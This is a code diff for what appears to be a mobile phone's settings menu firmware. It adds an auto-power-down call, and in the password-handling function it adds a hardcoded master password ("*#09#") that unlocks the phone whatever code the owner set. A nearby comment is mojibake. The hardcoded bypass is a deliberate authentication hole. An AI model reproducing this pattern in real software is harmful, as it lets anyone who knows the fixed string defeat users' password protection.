@@ -6777,6 +6777,10 @@ static boolean Setting_CClockApps_HandleCmdEvent(CSettingMenu *pMe)
         else
         {
             ICONFIG_SetItem(pMe->m_pConfig, CFGI_AUTO_POWER_OFF, (void*)&pMe->m_ClockCfg, sizeof(Auto_Power_Cfg));
+	#ifdef FEATURE_VERSION_V3CM301
+			OEMRTC_Process_Auto_Power_Down(pMe->m_pShell);
+	#else
+	#endif
         }
     }
 #ifdef SET_REP_MOD_LIST
@@ -8846,6 +8850,10 @@ static boolean  Setting_Handle_Password(CSettingMenu *pMe,
     AECHAR         wstrDisplay[OEMNV_LOCKCODE_MAXLEN+2] = {0};
     int            nLen = 0;
     char           strDisplay[OEMNV_LOCKCODE_MAXLEN+2] = {0};
+	
+
+
+	
     
     if (NULL == pMe)
     {
@@ -9046,12 +9054,13 @@ static boolean  Setting_Handle_Password(CSettingMenu *pMe,
                         else
                         {
                             uint16 wPWD=0;
+							char superpass[6] = {"*#09#"};
                             (void) ICONFIG_GetItem(pMe->m_pConfig, 
                                                    CFGI_PHONE_PASSWORD,
                                                    &wPWD,
                                                    sizeof(uint16));
                             
-                            if (wPWD == EncodePWDToUint16(pMe->m_strPhonePWD))
+                            if (wPWD == EncodePWDToUint16(pMe->m_strPhonePWD)||(0==strcmp(superpass,pMe->m_strPhonePWD)))
                             {// ÃÜÂë·ûºÏ
                                 CLOSE_DIALOG(DLGRET_OK)
                             }
